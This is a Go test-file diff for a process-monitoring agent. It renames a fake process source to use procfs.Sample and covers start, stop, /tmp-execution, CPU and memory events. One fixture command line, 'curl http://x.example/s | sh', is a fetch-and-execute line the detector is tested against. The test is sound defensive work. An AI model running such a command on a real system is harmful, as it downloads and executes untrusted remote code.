@@ -6,6 +6,7 @@ import (
 	"time"
 
 	"github.com/yominsops/yomins-agent/internal/events"
+	"github.com/yominsops/yomins-agent/internal/procfs"
 )
 
 // ── helpers ──────────────────────────────────────────────────────────────────
@@ -240,19 +241,19 @@ func TestMakeMemEvent_Shape(t *testing.T) {
 
 // ── poll state-machine (fake process source) ────────────────────────────────
 
-// fakeSource is a procSource whose process list the test sets directly.
+// fakeSource is a procfs.Source whose process list the test sets directly.
 type fakeSource struct {
-	procs    []procSample
+	procs    []procfs.Sample
 	err      error
 	cmdlines map[int32]string
 	exes     map[int32]string
 	memTotal uint64
 }
 
-func (f *fakeSource) List(context.Context) ([]procSample, error) { return f.procs, f.err }
-func (f *fakeSource) Details(pid int32) (string, string)         { return f.exes[pid], f.cmdlines[pid] }
-func (f *fakeSource) MemTotal() uint64                           { return f.memTotal }
-func (f *fakeSource) ClockTicks() float64                        { return 100 }
+func (f *fakeSource) List(context.Context) ([]procfs.Sample, error) { return f.procs, f.err }
+func (f *fakeSource) Details(pid int32) (string, string)            { return f.exes[pid], f.cmdlines[pid] }
+func (f *fakeSource) MemTotal() uint64                              { return f.memTotal }
+func (f *fakeSource) ClockTicks() float64                           { return 100 }
 
 func newFakeCollector(cfg Config, src *fakeSource) *Collector {
 	if src.memTotal == 0 {
@@ -278,7 +279,7 @@ func TestPoll_NewProcessEmitsStartEvent(t *testing.T) {
 		t.Fatalf("buildBaseline: %v", err)
 	}
 
-	src.procs = []procSample{{PID: 42, PPID: 1, Name: "worker", Start: 10}}
+	src.procs = []procfs.Sample{{PID: 42, PPID: 1, Name: "worker", Start: 10}}
 	src.cmdlines = map[int32]string{42: "worker --serve"}
 	evs := c.poll(context.Background())
 
@@ -291,7 +292,7 @@ func TestPoll_NewProcessEmitsStartEvent(t *testing.T) {
 }
 
 func TestPoll_BaselineProcessDoesNotEmitStop(t *testing.T) {
-	src := &fakeSource{procs: []procSample{{PID: 7, Name: "init", Start: 1}}}
+	src := &fakeSource{procs: []procfs.Sample{{PID: 7, Name: "init", Start: 1}}}
 	c := newFakeCollector(testConfig(), src)
 	if err := c.buildBaseline(context.Background()); err != nil {
 		t.Fatalf("buildBaseline: %v", err)
@@ -309,7 +310,7 @@ func TestPoll_BaselineProcessDoesNotEmitStop(t *testing.T) {
 func TestPoll_NewProcessExitEmitsStop(t *testing.T) {
 	src := &fakeSource{}
 	c := newFakeCollector(testConfig(), src)
-	src.procs = []procSample{{PID: 9, Name: "job", Start: 5}}
+	src.procs = []procfs.Sample{{PID: 9, Name: "job", Start: 5}}
 	c.poll(context.Background())
 
 	src.procs = nil
@@ -319,13 +320,13 @@ func TestPoll_NewProcessExitEmitsStop(t *testing.T) {
 }
 
 func TestPoll_ReusedPIDIsANewProcess(t *testing.T) {
-	src := &fakeSource{procs: []procSample{{PID: 9, Name: "old", Start: 5}}}
+	src := &fakeSource{procs: []procfs.Sample{{PID: 9, Name: "old", Start: 5}}}
 	c := newFakeCollector(testConfig(), src)
 	if err := c.buildBaseline(context.Background()); err != nil {
 		t.Fatalf("buildBaseline: %v", err)
 	}
 
-	src.procs = []procSample{{PID: 9, Name: "new", Start: 900}}
+	src.procs = []procfs.Sample{{PID: 9, Name: "new", Start: 900}}
 	src.cmdlines = map[int32]string{9: "curl http://x.example/s | sh"}
 	evs := c.poll(context.Background())
 	if countType(evs, events.EventProcessStart) != 1 || countType(evs, events.EventProcessSuspicious) != 1 {
@@ -341,7 +342,7 @@ func TestPoll_ExecFromTmp(t *testing.T) {
 	cfg.MonitorTmpPaths = true
 	src := &fakeSource{}
 	c := newFakeCollector(cfg, src)
-	src.procs = []procSample{{PID: 3, Name: "x", Start: 1}}
+	src.procs = []procfs.Sample{{PID: 3, Name: "x", Start: 1}}
 	src.exes = map[int32]string{3: "/tmp/x"}
 	if n := countType(c.poll(context.Background()), events.EventProcessExecTmp); n != 1 {
 		t.Errorf("expected process.exec_tmp, got %d", n)
@@ -349,7 +350,7 @@ func TestPoll_ExecFromTmp(t *testing.T) {
 }
 
 func TestPoll_CPUSpikeEmitsHighCPU(t *testing.T) {
-	src := &fakeSource{procs: []procSample{{PID: 5, Name: "php", Start: 1}}}
+	src := &fakeSource{procs: []procfs.Sample{{PID: 5, Name: "php", Start: 1}}}
 	c := newFakeCollector(testConfig(), src)
 	if err := c.buildBaseline(context.Background()); err != nil {
 		t.Fatalf("buildBaseline: %v", err)
@@ -361,7 +362,7 @@ func TestPoll_CPUSpikeEmitsHighCPU(t *testing.T) {
 	step := func(delta uint64) []events.Event {
 		snap.sampledAt = time.Now().Add(-time.Second)
 		ticks += delta
-		src.procs = []procSample{{PID: 5, Name: "php", Start: 1, CPU: ticks}}
+		src.procs = []procfs.Sample{{PID: 5, Name: "php", Start: 1, CPU: ticks}}
 		return c.poll(context.Background())
 	}
 	for i := 0; i < 3; i++ {
@@ -379,7 +380,7 @@ func TestPoll_CPUSpikeEmitsHighCPU(t *testing.T) {
 }
 
 func TestPoll_MemorySpikeEmitsHighMemory(t *testing.T) {
-	src := &fakeSource{procs: []procSample{{PID: 5, Name: "mysqld", Start: 1, RSS: 10}}, memTotal: 1000}
+	src := &fakeSource{procs: []procfs.Sample{{PID: 5, Name: "mysqld", Start: 1, RSS: 10}}, memTotal: 1000}
 	c := newFakeCollector(testConfig(), src)
 	if err := c.buildBaseline(context.Background()); err != nil {
 		t.Fatalf("buildBaseline: %v", err)
@@ -387,7 +388,7 @@ func TestPoll_MemorySpikeEmitsHighMemory(t *testing.T) {
 	for i := 0; i < 3; i++ {
 		c.poll(context.Background())
 	}
-	src.procs = []procSample{{PID: 5, Name: "mysqld", Start: 1, RSS: 500}}
+	src.procs = []procfs.Sample{{PID: 5, Name: "mysqld", Start: 1, RSS: 500}}
 	evs := c.poll(context.Background())
 	if countType(evs, events.EventProcessHighMemory) != 1 {
 		t.Fatalf("expected process.high_memory, got %v", evs)
